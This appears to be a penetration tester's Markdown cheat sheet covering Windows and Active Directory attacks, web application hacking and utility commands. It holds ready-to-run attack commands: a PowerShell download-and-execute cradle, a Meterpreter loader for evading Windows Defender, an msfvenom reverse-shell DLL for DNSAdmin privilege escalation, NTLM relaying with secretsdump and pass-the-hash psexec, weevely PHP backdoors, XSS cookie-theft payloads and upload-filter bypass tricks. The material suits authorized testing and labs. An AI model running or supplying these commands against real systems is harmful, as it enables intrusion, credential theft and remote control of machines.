Table of Contents
=================

   * [Table of Contents](#table-of-contents)
   * [Reconnaissance &amp; Gathering](#reconnaissance--gathering)
      * [Mapping the Network](#mapping-the-network)
      * [NBTscan](#nbtscan)
      * [Nmap scan basics](#nmap-scan-basics)
      * [DNS subdomains reconnaissance](#dns-subdomains-reconnaissance)
   * [PowerShell](#powershell)
      * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
      * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
   * [PrivEsc on Windows](#privesc-on-windows)
      * [Bypassing Windows Defender](#bypassing-windows-defender)
      * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
      * [Using BloodHound](#using-bloodhound)
      * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
      * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
   * [WebApplication Hacking](#webapplication-hacking)
      * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
      * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
      * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
      * [Bypassing file upload WAF](#bypassing-file-upload-waf)
   * [Utils](#utils)
      * [Shell to TT](#shell-to-tt)
      * [Capture traffic](#capture-traffic)
      * [Detect incoming Ping](#detect-incoming-ping)
      * [Mount SMB shares](#mount-smb-shares)
      * [Mount VHDX virtual machines](#mount-vhdx-virtual-machines)
   * [Miscellaneous](#miscellaneous)
      * [Terminal recording](#terminal-recording)
      * [Command output copy](#command-output-copy)
      * [Bash init commands](#bash-init-commands)

Created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc)

# Reconnaissance & Gathering
## Mapping the Network
If we wanted to check for machines on the subnet with SMB signing not enabled, we can use RunFinger.py which is in the responder toolset.
```bash
responder-RunFinger -i [IP_ADDRESS]</MASK>
responder-RunFinger -i 10.0.2.0/24
```
## NBTscan
It will scan IP networks for NetBIOS accesible information.
```bash
nbtscan -v -s : 192.168.1.0/24
```
## Nmap scan basics
The well-known nmap program will scan for reachable host and its version, possible vulnerabilities...
```bash
nmap -p- -sV -sS -T4 -oA nmap-output [IP]</MASK>
```
Additionaly, you can run it with:
* -sC: This will try to run some default scripts over the services
* -sV: Get the service version

## DNS subdomains reconnaissance
Starting an external assessment to any client, the firest we used to do is to perform a gathering phase over the clients domains,
in order to get as much information as possible. We usually do focus on subdomains finding, so we want to find out all the servers/vhosts/websites belonging to the client.

The following are tools we have used and get some good results with:
* fierce --> [Github](https://github.com/mschwager/fierce)
* censys --> [Github](https://github.com/christophetd/censys-subdomain-finder)
* sublist3r --> [Github](https://github.com/aboul3la/Sublist3r)

The best tool we are used so far is sublist3r because it supports the search into the main searching cores of internet (Google, Bing, etc...)
Fierce is the most basic one, yet very good to perform fast reconnaissances.
Censys needs an API, easy to retrieve from its website.


# PowerShell
## To load a PS module into the memory
```powershell
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString($URL);"
# Here call the modules you want to execute, depending on the usage of what you have downloaded
```

## Changing *ExecutionPolicy* to Bypass
The following command in PowerShell, if we have enough permissions, will change the executionPolicy so we should be able to execute, for instance, scripts.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

# PrivEsc on Windows
## Bypassing Windows Defender
There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them.

**NOTE:** There're some replaces needed in the listener.sh script:

1. *Line 12:* remove the ./ from the call to msfconsole
2. *Line 16:* add -job after the run sentence

```bash
./msf-loader.sh
# introduce LHOST
# introduce LPORT
# domain to impersonate?
# The process should have created a 'payload.exe' and also 'payload-signed.exe'
./listener.sh
# Define the LHOST
# Define the LPORT
# Now the payload shall be ran into the target
```

## Sharing files with Windows machine
**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)*
```bash
impacket-smbserver share [path] -smb2support
```

Using this simple technique we will be able to upload as much privesc tools as we want, in a easiest way.

## Using BloodHound
BloodHound is a very useful technique of Active Directory gathering. It would be a must in every Privilege Escalation we want to perform.
We have to download SharpHound.ps1 from its last repository *(it has been changed any times, so we have to check...)*
```powershell
# with our local machine sharing using any technique like python3 -m http.server or impacket-smbserver...
Set-Execution Bypass -Scope Process
Import-Module [PATH_TO_SHARE]\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
```

## From DNSAdmin to Administrator
Having this localgroup rights, it's possible to escalate to Administrator and achieve SYSTEM rights. As explained in [this link](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2), the steps to perform the privilege escalation are:
```bash
# Malicious DLL creation
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[LHOST] LPORT=8080 -f dll > privesc.dll
# Setting up SMB server to serve the DLL
impacket-smbserver evil .
```
```powershell
// Obtaining FQDN from host:
[System.Net.Dns]::GetHostByName($env:computerName)
dnscmd [FQDN] /config /serverlevelplugindll //[LHOST]/evil/privesc.dll
cmd.exe /c "sc.exe stop DNS"
cmd.exe /c "sc.exe start DNS"
```

## From Exchange Windows Permissions group to Administrators
Having this localgroup rights, it's possible to escalate to Administrators and achieve SYSTEM rights. This could be gained using, for instance, impacket libraries. These steps have to be followed:
```bash
./ntlmrelayx.py -t ldap://[RHOSTS] --escalate-user [USER_WE_HAVE]
: ' Results should looks like:
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
' 
```

Now I need to authorize the connection, I need to browse the http://localhost/privexchange and login as the user, which we want to enhance, to authenticate the action. As soon as I authenticate, I can see the user got permission.
```bash
: ' The terminal would look like:
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Client requested path: /privexchange
[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] User privileges found: Create user
[*] Dumping domain info for first time
[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Domain info dumped into lootdir!
[*] User privileges found: Create user
'
```

Secretsdump can be utilized to get hashes of more privileged users:
```bash
secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
# And if we have luck, we can use the hash with *psexec*, or try to crack it.
./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
```

# WebApplication Hacking
## Create a PHP Backdoor shell
The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
server.

```bash
# Generate new agent
weevely generate <password> <path>
# Run terminal or command on the target
weevely <URL> <password> [cmd]
# Recover an existing session
weevely session <path> [cmd]
```

## Demonstrating the possibility of steal cookies abusing of XSS vulnerability
```js
alert(self['alert'](self['document']['cookie']))
alert(document.cookie)
```

[Interesting link - talks about WAF bypass](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)

## Check for broken links to hijack
**broken-link-checker** will crawl a target and look for broken links. Whenever I use this tool I like to run:
```bash
blc -rof --filter-level 3 https://example.com/
```
Adapting it to something like this in order to prevent false positives:
```bash
blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
```

## Bypassing file upload WAF
The following are some tips to get the WAF bypassed, and be able to exploit some vulnerability to upload, for example, a webshell.
* Change *Content-Type*
* Try to change the file extension to some executable-extensions like *.php5, .php3, .shtml, .asa*
* Change extension letters to capital, for example *.pHp5, .Php3, .aSp, ...*
* Put spaces and/or dots at the end of the filename like *file.asp  . .    .... .*
* Use a semicolon after the forbidden extension and before the permitted extension. Example: *file.asp;.jpg* (Only IIS 6 or prior)
* Upload a file with multiple extensions like *file.php.jpg*
* Use a NULL-characters: *file.asp%00.php"*
* Create a file with a forbidden extension: *file.asp:.jpg* or *file.asp::$data*
* **Combination of the above**

# Utils
## Shell to TT
```bash
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl + z
stty raw -echo
fg
```

## Capture traffic
It's very recommendable to record all the traffic, while we're performing an internal InfoSec assesment to any client.
If it's expected to generate tons of traffic, for example, if we are testing a large infrastructure organisation, I recommend to capture
only the outgoing traffic, it is possible with the following command:

```bash
sudo tcpdump -v -ni [INTERFACE] -w [FILE-OUT] -C 100 src host [OUR_IP]
```

However, if we want to capture both outbound and inbound traffic, use the following command:

```bash
sudo tcpdump -v -ni [INTERFACE] -w [FILE-OUT] -C 100
```

The commands above are going to generate files with size of 100 Mb, so it will be feasible to analyze, if necessary.

## Detect incoming Ping
Very useful when we are trying to get reverse connection, for example from a RCE vulnerability. The following command will dump all the incoming
ping to our network interface.

```bash
sudo tcpdump ip proto \\icmp
```

## Mount SMB shares
Great option if we're looking for some more control among the data located in those shares exposed. If we mount locally we will be able to perform actions like "grep -ri 'any-keyword' /mnt/juicy-share", por example..

We can mount SMB with the following command:
```bash
sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME]
```

Of course it won't be that easy the most of the times, if we want to give credentials and domain we can use this command:
```bash
sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME] -o "username=[USER],password=[PASS],domain=[DOMAIN]" /mnt/[SHARE_NAME]
```

## Mount VHDX virtual machines
If we are given with any virtual machine export, we can mount its content with the following command line:

```bash
sudo guestmount --add /media/audit2/Disco_ext1/LadyBird/ladybird.vhdx --inspector --ro /mnt/LadyBird/
```

# Miscellaneous
## Terminal recording

We can add the following line to our *~/.bashrc* file in order to record each terminal we open.

```bash
test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/.log/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)
```

## Command output copy

It could be necessary to copy the command output directly to the **clipboard**, the following command make it possible:

```bash
[COMMAND] | xclip -selection clipboard
```
## Bash init commands

It would be very interesting to add this oneliner command to the "Initial command" from the selected terminal-type:
```bash
tput bold; tput setaf 2; echo -n "wlan0: ";ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; if ifconfig tun0 2> /dev/null 1>&2; then echo -n "tun0: ";ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; fi; tput init; bash 
```
This command above will place, every time we open a new terminal, the following usefull data:
wlan0: [IP]
tun0: [IP]

I have utilized this information because these are the interfaces I normally have UP. Of course the command is highly escalable according the each one needs...
